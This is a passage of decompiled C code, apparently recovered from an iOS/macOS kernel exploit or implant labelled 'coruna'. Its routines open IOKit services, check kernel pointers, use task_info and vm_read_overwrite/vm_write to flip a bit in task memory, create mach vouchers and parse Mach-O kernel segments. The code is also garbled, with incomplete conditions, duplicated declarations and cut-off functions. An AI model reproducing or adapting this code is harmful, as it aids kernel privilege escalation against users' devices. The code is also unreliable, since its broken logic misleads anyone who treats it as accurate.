    if (1 < (int)u + 1U) {
      if (handle == 0) {
        err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
joined_r0x0000a220:
        version = 0;
        if (err == 0) {
          scratch = scratch & 0xffffffff00000000;
          handle = coruna_kernel600c_via_return_zero_28118(off,host_info);
          if ((handle == 0) ||
             (err = _IORegistryEntryGetChildIterator(u,"IOService",&scratch), err != 0)) {
            version = 0;
          }
          else {
          while( true ) {
            size = _IOIteratorNext(scratch & 0xffffffff);
            err = (int)size;
            if (err == 0) break;
            addr = coruna_kernel600c_via_return_zero_28118(off,size);
            if (handle == addr) {
              handle = 0;
              break;
            }
            _IOObjectRelease(size);
          }
          _IOObjectRelease(scratch & 0xffffffff);
          version = 0;
          if ((err != 0) && (handle != 0)) {
            handle = handle + 0x20;
            status = coruna_kernel600c_residual_193(off,handle,&thread_attr);
            if ((status != 0) &&
               (status = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,*(uint64_t *)(off + 0x390)), status != 0)) {
              status = _IORegistryEntryCreateCFProperties
                                (size,&bootargs,*(uint64_t *)k_kernel_kcfallocatordefault_slot,0)
              ;
              flags = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,thread_attr);
              if ((flags == 0) || (status != 0)) {
                if (bootargs != 0) {
                  _CFRelease();
                }
              }
              else if (bootargs != 0) {
                *ptr = bootargs;
                version = 1;
              }
            }
            version = 0;
          }
          if (1 < err + 1U) {
            _IOObjectRelease(size);
          }
          }
        }
      }
      else {
        err = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),0);
        if (err == 0) {
          version = 0;
        }
        else {
          err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
          status = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),handle);
          version = 0;
          if (status != 0) {
            err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
            version = 0;
            if (err == 0) goto joined_r0x0000a220;
          }
        }
      }
      if (1 < host_info + 1U) {
        scratch = 1;
        _IOServiceClose();
        _IOServiceWaitQuiet(u,&scratch);
      }
      _IOObjectRelease(u);
      *(uint32_t *)(handle + 3) = version;
      return;
    }
  }
  version = 0;
skip:
  *(uint32_t *)(handle + 3) = version;
  return;
}





uint64_t coruna_ioservice_publish(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    u = coruna_mig_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if ((int)u != 0) {
      *arg = scratch;
      return u;
    }
    _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  }
  return 0;
}





uint64_t coruna_call_ioservicegetmatchingservice(void)
{
  coruna_ioservicegetmatchingservice_1bb7c("xyz");
  return 0;
}





void coruna_fn_ptr_cast(void)
{
  return;
}





unsigned long coruna_ptr_canonicalize(uint64_t arg,unsigned long val)

{
  if ((val & 7) != 0 || 0xffffffffeffe < val + 0x1000000000000) {
    val = 0;
  }
  return val;
}





unsigned long coruna_kptr_in_mapped_range(long arg,unsigned long val)

{
  unsigned long type_id_21;
  long base;
  unsigned long u;
  long *entry_10;
  
  if (0xffffffffeffe < val + 0x1000000000000) {
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + arg);
    if (*(uint *)(&k_kernel_slot_18a0 + arg) != 0) {
      entry_10 = (long *)(&k_kernel_slot_1a18 + arg);
      do {
        type_id_21 = entry_10[-1];
        base = *entry_10;
        if ((((type_id_21 != 0 && base != 0) && type_id_21 <= val) && val <= base + type_id_21) &&
            (((type_id_21 == 0 || base == 0) || val < type_id_21) || base + type_id_21 != val)) {
          return val;
        }
        entry_10 = entry_10 + 3;
        u = u - 1;
      } while (u != 0);
    }
    val = 0;
  }
  return val;
}



coruna_svc_regpack_t coruna_ioservice_open_path(long *arg)

{
  long handle;
  unsigned long type_id_17;
  long *entry_11;
  long serial_12;
  unsigned long version;
  unsigned long *ptr;
  uint8_t u[16];
  
  entry_11 = (long *)*arg;
  handle = arg[1];
  serial_12 = *entry_11 + (unsigned long)*(uint *)(entry_11 + 0x19) * 0x38;
  if ((unsigned long)(handle - *(long *)(serial_12 + 0x20)) < *(unsigned long *)(serial_12 + 0x28)) {
load_ok_44:
    if (*(char *)((long)entry_11 + 0x101) != '\0') {
      entry_11 = (long *)entry_11[0x15];
    }
    version = handle - entry_11[0x1e];
    if (((unsigned long)entry_11[0x16] <= version) &&
       u = type_id_17;
       u = version;
       return u;
  }
  else if (*(uint *)(entry_11 + 1) != 0) {
    version = 0;
    ptr = (unsigned long *)(*entry_11 + 0x28);
    do {
      if (handle - ptr[-1] < *ptr) {
        *(int *)(entry_11 + 0x19) = (int)version;
        if (*(char *)((long)entry_11 + 0x101) != '\0') {
        entry_11 = (long *)entry_11[0x15];
        }
        version = handle - entry_11[0x1e];
        if (((unsigned long)entry_11[0x16] <= version) &&
        u = type_id_17;
        u = version;
        return u;
      }
      version = version + 1;
      ptr = ptr + 7;
    } while (*(uint *)(entry_11 + 1) != version);
  }
  version = 0;
  type_id_17 = 0;
load_ok_45:
  u = type_id_17;
  u = version;
  return u;
}





uint64_t coruna_sizeof_ptr(void)
{
  return 8;
}





kern_return_t coruna_vm_allocate(long handle)
{
  size_t ls1;
  kern_return_t lk2;
  unsigned long u;
  vm_address_t scratch;
  
  if (*(char *)(handle + 0x101) == '\0') {
    if (((*(byte **)(handle + 0x108) == (byte *)0x0) ||
        (scratch = *(vm_address_t *)(handle + 0xb0), scratch == 0)) ||
       (*(vm_size_t *)(handle + 0xb8) == 0)) {
      return 4;
    }
    if ((**(byte **)(handle + 0x108) >> 1 & 1) != 0) {
      lk2 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                           *(vm_size_t *)(handle + 0xb8),0x4000);
      if (lk2 != 0) {
        return lk2;
      }
      u = (unsigned long)*(int *)(handle + 0x38);
      ls1 = 0;
      if (u != 0) {
        ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
      }
      _bzero(*(void **)(handle + 0x108),ls1);
    }
  }
  return 0;
}





uint64_t coruna_kernel600c_via_ioconnect_fd_setup(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint size)
{
  int err;
  uint u;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  
  handle = handle;
  if (*(char *)(handle + 0x101) != '\0') {
    handle = *(long *)(handle + 0xa8);
  }
  kind = *(unsigned long *)(handle + 0xb0);
  if ((arg < kind) || (*(long *)(handle + 0xb8) + kind < arg + arg)) {
    size = 3;
  }
  else {
    size = 0;
    port = (unsigned long)-*(int *)(handle + 0x38);
    tag = port & arg;
    port = ((long)*(int *)(handle + 0x38) + arg + arg) - 1 & port;
    if (tag < port) {
      type_id = (unsigned long)*(int *)(handle + 0x38);
      do {
        version = 0;
        if (type_id != 0) {
          version = (tag - kind) / type_id;
        }
        if (((*(byte *)(*(long *)(handle + 0x108) + version) & 1) == 0) || ((size & 1) != 0)) {
          err = coruna_return_zero_1cf78(*(uint64_t *)(handle + 0x118));
          if (((err != 0) &&
              (((err = coruna_uuid_is_null(*(uint64_t *)(handle + 0x118)), err != 0 &&
                (u = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118)),
                *(uint *)(handle + 0x38) < u)) &&
               (version = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118)),
               port - tag < (version & 0xffffffff))))) && (arg < val)) {
            port = ((long)*(int *)(handle + 0x38) + arg + val) - 1 &
                    (long)-*(int *)(handle + 0x38);
            version = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118));
            if (tag + (version & 0xffffffff) < port) {
              port = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118));
              port = tag + (port & 0xffffffff);
            }
          }
          err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(*(uint64_t *)(handle + 0x118),
                               (*(long *)(handle + 0xe0) - kind) + tag,port - tag,tag);
          if (err != 0) {
            if (tag < port) {
              do {
                version = 0;
                if (type_id != 0) {
                  version = (tag - kind) / type_id;
                }
                *(byte *)(*(long *)(handle + 0x108) + version) =
                     *(byte *)(*(long *)(handle + 0x108) + version) | 1;
                tag = tag + type_id;
              } while (tag < port);
            }
            **(byte **)(handle + 0x108) = **(byte **)(handle + 0x108) | 2;
            return 0;
          }
          return 5;
        }
        tag = tag + type_id;
      } while (tag < port);
      size = 0;
    }
  }
  return size;
}





void coruna_call_mach_vm_machine_attribute_29df8(void)
{
  coruna_kernel600c_via_ioconnect_fd_setup();
  return;
}





uint32_t coruna_kernel600c_via_ioservice_open_path(uint64_t val,uint64_t id_2)
{
  uint32_t u;
  uint32_t *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 4;
  scratch = val;
  scratch = id_2;
  ptr = (uint32_t *)coruna_ioservice_open_path(&scratch,1);
  u = 0;
  if (ptr != (uint32_t *)0x0) {
    coruna_kernel600c_via_ioconnect_fd_setup(val,ptr,4,0,0);
    u = *ptr;
  }
  return u;
}





uint64_t coruna_kernel600c_via_ioservice_open_path_2(uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 8;
  scratch = val;
  scratch = id_2;
  ptr = (uint64_t *)coruna_ioservice_open_path(&scratch,1);
  u = 0;
  if (ptr != (uint64_t *)0x0) {
    coruna_kernel600c_via_ioconnect_fd_setup(val,ptr,8,0,0);
    u = *ptr;
  }
  return u;
}





void coruna_macho_find_loadcmd(long *handle,long addr_2,char *path)
{
  int *err;
  int *status;
  int err;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  while( true ) {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if ((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0))
    break;
  }
  *handle = addr_2;
  handle = *(long *)(err + 6);
  handle[2] = *(long *)(err + 8);
  handle[1] = handle;
  return;
}





void coruna_macho_map_segsect(long *handle,long addr_2,char *path,char *str_2)
{
  int *err;
  int *status;
  int err;
  int *flags;
  unsigned long u;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  do {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if (((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0)) &&
       (u = (unsigned long)(uint)err[0x10], err[0x10] != 0)) {
      flags = err + 0x12;
      do {
        err = _strncmp((char *)flags,str_2,0x10);
        if (err == 0) {
          *handle = addr_2;
          handle = *(long *)(flags + 8);
          handle[2] = *(long *)(flags + 10);
          handle[1] = handle;
          return;
        }
        flags = flags + 0x14;
        u = u - 1;
      } while (u != 0);
    }
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
  } while( true );
}





void coruna_macho_text_sect(long handle)
{
  coruna_macho_map_segsect(handle,*(uint64_t *)(handle + 0x110),"__text");
  return;
}





uint64_t coruna_return_zero_12cb8(long handle,char *path,unsigned long arg)
{
  int *err;
  int *status;
  size_t ls3;
  uint u;
  int err;
  uint size;
  
  err = (int *)(**(long **)(handle + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(handle + 0xd0) + 0x14));
  do {
    if (status <= err) {
      return 0;
    }
    if (*err == -0x7fffffcb) {
      u = err[6];
      size = err[1];
      if (0x1f < u && u < size) {
        ls3 = arg;
        if (size - u <= arg) {
          ls3 = (unsigned long)(size - u);
        }
        err = _strncmp((char *)((long)err + (unsigned long)u),path,ls3);
        if (err == 0) {
          return *(uint64_t *)(err + 2);
        }
      }
    }
    else {
      size = err[1];
    }
    err = (int *)((long)err + (unsigned long)size);
  } while( true );
}





void coruna_ctx_clear_1090c(uint64_t *val,uint64_t id_2)
{
  val[0x21] = 0;
  val[0x20] = 0;
  val[0x23] = 0;
  val[0x22] = 0;
  val[0x1d] = 0;
  val[0x1c] = 0;
  val[0x1f] = 0;
  val[0x1e] = 0;
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[0x23] = id_2;
  val[0x24] = 0;
  return;
}





uint64_t coruna_vm_deallocate_12d98(long handle)
{
  kern_return_t lk1;
  uint64_t u;
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xb0);
  if (((address == 0) || (*(vm_size_t *)(handle + 0xb8) == 0)) ||
     (lk1 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,
                             *(vm_size_t *)(handle + 0xb8)), lk1 != 0)) {
    u = 0;
  }
  else {
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
    u = 1;
  }
  return u;
}





bool coruna_vm_deallocate_12de8(long handle)
{
  size_t ls1;
  uint8_t *ptr;
  bool err;
  kern_return_t lk4;
  void *ptr;
  unsigned long u;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk4 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                  *(vm_size_t *)(handle + 0xe8),(long)*(int *)(handle + 0x38) - 1,1,0,0,0,3,1,
                  in_stack_ffffffffffffffd0);
  err = false;
  if (lk4 == 0) {
    if ((*(vm_address_t *)(handle + 0xb0) != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xb0),
                     *(vm_size_t *)(handle + 0xb8));
    }
    *(vm_address_t *)(handle + 0xb0) = scratch;
    *(long *)(handle + 0xb8) = *(long *)(handle + 0xe8);
    *(vm_address_t *)(handle + 0xf0) = *(long *)(handle + 0xe0) - scratch;
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    ptr = _calloc(ls1,1);
    *(void **)(handle + 0x108) = ptr;
    err = ptr != (void *)0x0;
  }
  return err;
}





uint64_t coruna_macho_text_seg(long handle,long addr_2)
{
  size_t ls1;
  int err;
  void *ptr;
  uint64_t u;
  int *err;
  uint8_t size;
  unsigned long version;
  long *buf;
  int *status;
  long handle;
  int *flags;
  uint8_t scratch[20];
  uint bootargs;
  
  ptr = _calloc(0x48,1);
  *(void **)(handle + 0xd0) = ptr;
  if (ptr == (void *)0x0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(*(uint64_t *)(handle + 0x118),addr_2,0x20,scratch);
  if ((int)u == 0) {
    return u;
  }
  ls1 = (unsigned long)bootargs + 0x20;
  err = _calloc(ls1,1);
  if (err == (int *)0x0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(*(uint64_t *)(handle + 0x118),addr_2,ls1,err);
  if ((int)u == 0) {
    return u;
  }
  **(uint64_t **)(handle + 0xd0) = err;
  if (*err == -0x1120532) {
    size = 4;
  }
  else {
    if (*err != -0x1120531) {
      return 0;
    }
    size = 8;
  }
  *(uint8_t *)(handle + 0x34) = size;
  if (ls1 < err[5] + 0x20) {
    return 0;
  }
  status = err + 8;
  err = (int *)((long)status + (unsigned long)(uint)err[5]);
  if (err <= status) {
    return 1;
  }
  handle = 0;
  flags = status;
  do {
    if ((*flags == 0x19) && (err = _strcmp((char *)(flags + 2),"__TEXT"), err == 0)) {
      handle = addr_2 - *(long *)(flags + 6);
    }
    flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
  } while (flags < err);
  if (handle == 0) {
    return 1;
  }
  if (err <= status) {
    return 1;
  }
  do {
    if (*status == 0x19) {
      version = (unsigned long)(uint)status[0x10];
      if (status[0x10] != 0) {
        buf = (long *)(status + 0x1a);
        do {
          *buf = *buf + handle;
          version = version - 1;
          buf = buf + 10;
        } while (version != 0);
      }
      *(long *)(status + 6) = *(long *)(status + 6) + handle;
    }
    status = (int *)((long)status + (unsigned long)(uint)status[1]);
  } while (status < err);
  return 1;
}





bool coruna_call_find_text_exec_1305c(void)
{
  int err;
  
  err = coruna_find_text_exec();
  return err != 0;
}





unsigned long coruna_find_text_exec(long *arg,uint32_t val,unsigned long n,uint64_t m)

{
  uint8_t (*lpau1) [16];
  int *status;
  int *flags;
  uint size;
  bool count;
  int j;
  unsigned long port;
  long *entry_12;
  uint type_id_15;
  unsigned long type_id_16;
  unsigned long tag;
  int *count;
  uint type_id_22;
  uint type_id_18;
  long serial_7;
  unsigned long type_id;
  unsigned long type_id_8;
  long serial_9;
  uint8_t size[16];
  uint8_t cache_75[16];
  long cache_77;
  
  port = coruna_macho_text_seg(arg,n);
  if ((int)port == 0) {
    return port;
  }
  *(uint32_t *)(arg + 0x1b) = val;
  *(uint8_t *)(arg + 0x20) = 1;
  serial_7 = *(long *)arg[0x1a];
  count = (int *)(serial_7 + 0x20);
  type_id_18 = *(uint *)(serial_7 + 0x14);
  flags = (int *)((long)count + (unsigned long)type_id_18);
  if ((count < flags && (int *)(serial_7 + 0x28U) <= flags) && count <= flags + -2) {
    type_id_15 = 0;
    while( true ) {
      size = count[1];
      if ((size < 8) || ((unsigned long)((long)flags - (long)count) < (unsigned long)size)) break;
      j = *count;
      type_id_22 = 0x18;
      if (j < 0xb) {
        if (j != -0x7fffffe1) {
          type_id_22 = 0x30;
          }
          else {
          count = (int *)((long)count + (unsigned long)size);
          if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
          count = (int *)((long)count + (unsigned long)size);
          if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
        }
load_ok_48:
        if (size < type_id_22) break;
      }
      else {
        if (0x18 < j) {
          if (j == 0x22) {
load_ok_46:
            type_id_22 = 0x30;
          }
          else {
            count = (int *)((long)count + (unsigned long)size);
            if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
            type_id_15 = type_id_15 + 1;
            type_id_22 = 0x48;
          }
          if (size < type_id_22) break;
        }
        if (j == 0xb) {
          type_id_22 = 0x50;
          if (size < type_id_22) break;
        }
        if (size < type_id_22) break;
      }
load_ok_47:
      count = (int *)((long)count + (unsigned long)size);
      if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
    }
    if (type_id_15 != 0) {
      *(uint *)(arg + 1) = type_id_15;
      entry_12 = _malloc((unsigned long)type_id_15 * 0x38);
      *arg = (long)entry_12;
      if (entry_12 == (long *)0x0) {
        return 0;
      }
      arg[0x22] = (long)"__TEXT";
      count = (int *)(serial_7 + 0x20);
      flags = (int *)((long)count + (unsigned long)type_id_18);
      if (count < flags) {
        do {
          if (*count == 0x19) {
            if (((unsigned long)(uint)count[1] - 0x48) / 0x50 < (unsigned long)(uint)count[0x10]) {
              return 0;
            }
            j = _strcmp((char *)(count + 2),"__TEXT_EXEC");
            if (j == 0) {
              arg[0x22] = (long)"__TEXT_EXEC";
            }
            serial_9 = *(long *)(count + 0xc);
            serial_7 = *(long *)(count + 10);
            *entry_12 = (long)arg;
            entry_12[2] = serial_9;
            entry_12[1] = serial_7;
            serial_9 = *(long *)(count + 8);
            serial_7 = *(long *)(count + 6);
            entry_12[3] = (long)arg;
            entry_12[5] = serial_9;
            entry_12[4] = serial_7;
            entry_12[6] = (long)count;
            entry_12 = entry_12 + 7;
          }
          count = (int *)((long)count + (unsigned long)(uint)count[1]);
        } while (count < flags);
        serial_7 = *(long *)arg[0x1a];
      }
      serial_9 = NEON_rev64(*(uint64_t *)(serial_7 + 4),4);
      arg[5] = serial_9;
      *(uint32_t *)(arg + 6) = *(uint32_t *)(serial_7 + 0x18);
      type_id_18 = (uint)m;
      if ((type_id_18 >> 8 & 1) != 0) {
        coruna_macho_map_segsect(cache_75,arg,"__TEXT","__thread_starts");
        if (cache_77 != 0) {
          *(uint8_t *)((long)arg + 0x9c) = 1;
        }
        if ((((type_id_18 >> 10 & 1) != 0) && (*arg != 0)) &&
           (serial_7 = *(long *)(*arg + 8), serial_7 != 0)) {
          arg[0x14] = n - serial_7;
        }
      }
      if ((type_id_18 >> 6 & 1) != 0) {
        return 1;
      }
      count = (int *)(*(long *)arg[0x1a] + 0x20);
      flags = (int *)((long)count + (unsigned long)*(uint *)(*(long *)arg[0x1a] + 0x14));
      if (count < flags) {
        port = 0;
        count = false;
        type_id_16 = (long)(int)arg[7] - 1;
        type_id_8 = n;
        do {
          tag = type_id_8;
          if (*count == 0x19) {
            status = count + 2;
            j = _strcmp((char *)status,"__TEXT");
            if (j == 0) {
              arg[0x1f] = n - *(long *)(count + 6);
            }
            if (((type_id_18 >> 8 & 1) != 0) && (j = _strcmp((char *)status,"__KLD"), j == 0)) {
              count = true;
            }
            type_id = port;
            if ((((type_id_18 & 0x580) != 0x180) && (*(long *)(count + 8) != 0)) &&
               (type_id = *(long *)(count + 6) + *(long *)(count + 8), type_id <= port)) {
              type_id = port;
            }
            if ((((type_id_18 >> 10 & 1) != 0) && (*(long *)(count + 8) != 0)) &&
               (tag = *(unsigned long *)(count + 6), type_id_8 <= tag || tag == 0)) {
              tag = type_id_8;
            }
            j = _strcmp((char *)status,"__LINKEDIT");
            port = type_id;
            if (j == 0) {
              lpau1 = (uint8_t (*) [16])(count + 8);
              size = NEON_ext(*lpau1,*lpau1,8,1);
              port = *(long *)*lpau1 + *(long *)(count + 6);
              if ((type_id_18 & 0x580) != 0x180) {
                port = type_id;
              }
              arg[2] = *(long *)(count + 6);
              arg[4] = size;
              arg[3] = size;
            }
          }
          count = (int *)((long)count + (unsigned long)(uint)count[1]);
          type_id_8 = tag;
        } while (count < flags);
        if (((uint)!count & type_id_18 >> 8) != 0) {
          return 0;
        }
        if (port == 0) {
          return 0;
        }
        if ((((type_id_18 ^ 0xffffffff) & 0x500) == 0) && (arg[0x14] != 0)) {
          tag = arg[0x14];
        }
        if (tag != n) {
          n = tag & (type_id_16 ^ 0xffffffffffffffff);
        }
        port = port + type_id_16 & (type_id_16 ^ 0xffffffffffffffff);
        if (n <= port) {
          arg[0x1c] = n;
          arg[0x1d] = port - n;
          j = coruna_vm_deallocate_12de8(arg,m);
          return (unsigned long)(j != 0);
        }
      }
    }
  }
  return 0;
}





bool coruna_call_find_text_exec(void)
{
  int err;
  
  err = coruna_find_text_exec();
  return err != 0;
}





void coruna_kernel29478_via_vm_deallocate_12d98(uint64_t *val)
{
  uint64_t *ptr;
  
  coruna_vm_deallocate_12d98();
  ptr = (uint64_t *)val[0x1a];
  if (ptr != (uint64_t *)0x0) {
    if ((void *)*ptr != (void *)0x0) {
      _free((void *)*ptr);
      ptr = (uint64_t *)val[0x1a];
      *ptr = 0;
    }
    _free(ptr);
    val[0x1a] = 0;
  }
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
    *val = 0;
  }
  if ((void *)val[0x21] != (void *)0x0) {
    _free((void *)val[0x21]);
    val[0x21] = 0;
  }
  return;
}





uint64_t coruna_vm_read_overwrite(uint64_t val)
{
  unsigned long *address;
  int err;
  kern_return_t lk2;
  vm_map_t target_task;
  vm_size_t scratch;
  unsigned long bootargs;
  long thread_attr;
  
  err = coruna_task_info(val,&thread_attr);
  if (err == 0) {
    address = (unsigned long *)(thread_attr + 0x28);
    target_task = (vm_map_t)val;
    if (*(vm_map_t *)k_kernel_mach_task_self_slot == target_task) {
      *address = *address | 1;
      return 1;
    }
    lk2 = _vm_read_overwrite(target_task,(vm_address_t)address,8,(vm_address_t)&bootargs,
                               &scratch);
    if (lk2 == 0) {
      bootargs = bootargs | 1;
      lk2 = _vm_write(target_task,(vm_address_t)address,(vm_offset_t)&bootargs,8);
      if (lk2 == 0) {
        return 1;
      }
    }
  }
  return 0;
}





kern_return_t coruna_task_info(task_name_t arg,long *handle)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  long bootargs [3];
  
  scratch = 5;
  lk1 = _task_info(arg,0x11,(task_info_t)bootargs,&scratch);
  if (lk1 == 0) {
    if (bootargs[0] == 0) {
      lk1 = 5;
    }
    else {
      lk1 = 0;
      *handle = bootargs[0];
    }
  }
  return lk1;
}





long coruna_kernel600c_via_task_info(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_kernel600c_residual_222(id_2);
  if (((int)u < 0) ||
     (err = coruna_task_info(*(uint32_t *)k_kernel_mach_task_self_slot,&scratch), err != 0)) {
    handle = 0;
  }
  else {
    handle = 0;
    if (u < 8) {
      handle = scratch + (unsigned long)(u + 6) * 4 + 0xe8;
    }
  }
  return handle;
}





uint32_t coruna_kernel600c_residual_222(uint size)
{
  if (size < 0x1a) {
    return *(uint32_t *)(&k_kernel_rodata_word_3745c + (long)(int)size * 4);
  }
  return 0xffffffff;
}





uint8_t * coruna_mach_port_mod_refs(long handle,unsigned long arg,mach_port_name_t *arg_x)
{
  uint u;
  int err;
  mach_port_name_t *lpm3;
  uint8_t *ptr;
  uint64_t size;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    return &k_kernel_slot_1001;
  }
  else {
    lpm3 = (mach_port_name_t *)coruna_kernel600c_via_task_info(handle,arg);
    return &k_kernel_slot_1001;
  }
  *arg_x = bootargs;
  return (uint8_t *)0x0;
}





unsigned long coruna_mach_port_deallocate_137e4(uint64_t arg,uint64_t val,vm_size_t n,vm_address_t *m)

{
  uint type_id_21;
  uint type_id_17;
  unsigned long u;
  vm_inherit_t unaff_w22;
  mem_entry_name_port_t cache_81;
  
  cache_81 = 0;
  u = coruna_mach_port_mod_refs(arg,val,&cache_81);
  type_id_21 = (uint)u;
  if (type_id_21 == 0) {
    if (m == (vm_address_t *)0x0) {
      u = 0;
      if (1 < cache_81 + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_81);
      }
      return u;
    }
    type_id_17 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,m,n,0,1,cache_81,0,0,3,2,
                    unaff_w22);
    type_id_21 = 0;
    if (type_id_17 != 0) {
      type_id_21 = type_id_17 | 0x80000000;
    }
    u = (unsigned long)type_id_21;
  }
  if (((type_id_21 != 0) && (m != (vm_address_t *)0x0)) && (*m != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*m,n);
    *m = 0;
  }
load_ok_49:
  if (1 < cache_81 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_81);
  }
  return u;
}





uint64_t coruna_kernel600c_via_mach_port_deallocate_137e4(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t scratch;
  
  scratch = 0;
  size = *(uint64_t *)k_kernel_vm_page_size_slot;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    u = coruna_mach_port_deallocate_137e4(handle,0x10,size,&scratch);
    if ((int)u == 0) {
      *(uint64_t *)(handle + 0x118) = scratch;
      *(uint64_t *)(handle + 0x120) = size;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_mach_port_deallocate_1393c(uint *size,uint32_t *size_x)
{
  uint8_t *ptr;
  int err;
  uint u;
  unsigned long size;
  uint32_t version;
  uint *buf;
  long handle;
  mach_port_name_t *lpm8;
  uint64_t port;
  long addr;
  long off;
  stat scratch;
  uint32_t bootargs;
  uint thread_attr [2];
  uint64_t host_info;
  mach_port_name_t serial_buf [4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf[0] = 0;
  serial_buf[1] = 0;
  serial_buf[2] = 0;
  serial_buf[3] = 0;
  thread_attr[0] = 0xffffffff;
  thread_attr[1] = 0xffffffff;
  host_info = 0xffffffffffffffff;
  bootargs = 0xffffffff;
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) || ((*size & 0x5584001) == 0)) {
    addr = 3;
    if (*(unsigned long *)(size + 0x56) < 0x1f530000000000) {
      addr = 4;
    }
  }
  else {
    addr = 3;
  }
  err = coruna_open_dev_null(&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if (err == 0) {
    handle = 0x1122334455667788;
    lpm8 = serial_buf;
    buf = thread_attr;
    off = addr;
    do {
